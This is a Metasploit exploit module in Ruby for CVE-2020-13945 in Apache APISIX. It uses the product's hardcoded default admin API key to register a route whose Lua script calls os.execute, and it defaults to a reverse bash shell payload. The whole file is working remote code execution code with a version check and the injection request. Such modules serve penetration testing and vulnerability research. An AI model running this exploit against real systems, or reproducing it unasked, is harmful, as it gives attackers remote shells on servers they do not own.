##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'APISIX Admin API default access token RCE',
        'Description' => %q{
          Apache APISIX has a default built-in API token edd1c9f034335f136f87ad84b625c8f1
          that can be used to access all the admin API, which leads to the
          remote LUA code execution through the script parameter added in the 2.x version.
        },
        'Author' => [
          'Heyder Andrade <eu[at]heyderandrade.org>', # module development and debugging
          'YuanSheng Wang <membphis[at]gmail.com>' # discovered
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-13945'],
          ['URL', 'https://github.com/apache/apisix/pull/2244'],
          ['URL', 'https://seclists.org/oss-sec/2020/q4/187']
        ],
        'DisclosureDate' => '2020-12-07',
        'Arch' => ARCH_CMD,
        'Platform' => %w[win unix],
        'Targets' => [
          [
            'Unix (In-Memory)',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_memory,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
            }
          ]
        ],
        'Privileged' => false,
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to the routes controller', '/apisix/admin/routes']),
      OptString.new('API_KEY', [true, 'Admin API KEY (Default: edd1c9f034335f136f87ad84b625c8f1)', 'edd1c9f034335f136f87ad84b625c8f1'])
    ])
  end

  def check
    print_status("Checking component version to #{datastore['RHOST']}:#{datastore['RPORT']}")
    # perform an unautheticated request to a random path
    res = send_request_cgi({
      'uri' => normalize_uri(Rex::Text.rand_text_alpha_lower(6)), # random path
      'method' => 'GET'
    })

    if res && res.headers.key?('Server')
      res.headers['Server'].match(%r{APISIX/(.*)$})
      version = Rex::Version.new(Regexp.last_match(1))
      vprint_status "Found an APISIX #{version}"
      if version > Rex::Version.new('2')
        vprint_good 'This version has the script feature'
        # authenticated request to the admin routes
        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path.to_s),
          'method' => 'GET',
          'headers' => { 'X-API-KEY' => datastore['API_KEY'] }
        })

        if res && res.code == 200
          vprint_good 'Succefully performed an authenticated request'
          return Exploit::CheckCode::Appears
        end
      else
        vprint_error 'This version has not the script feature'
        return Exploit::CheckCode::Safe
      end
    else
      vprint_error 'Seems not a APISIX server'
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    add_route Rex::Text.rand_text_alpha_lower(6)
    handler
  end

  def add_route(path)
    # unable to use the built-in lua payload because the default instalation of the APISIX doesn't have the socket module
    body = "{
        \"uri\": \"#{path}\",
        \"script\": \"require('os');os.execute('#{payload.raw.to_s.gsub('\'', '\"')}');\",
        \"upstream\": {
          \"type\": \"roundrobin\",
          \"nodes\": {
            \"#{Rex::Text.rand_text_alpha_lower(6)}.#{Rex::Text.rand_text_alpha_lower(3)}\": 1
          }
        }
      }" # .to_json - cannot convert hash to json because it encode the '>' to unicode \u003C
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path.to_s),
      'method' => 'POST',
      'data' => body,
      'ctype' => 'application/json',
      'headers' => {
        'X-API-KEY' => datastore['API_KEY'],
        'Accept' => '*/*',
        'Accept-Encoding' => 'gzip, deflate'
      }
    })
  end

end
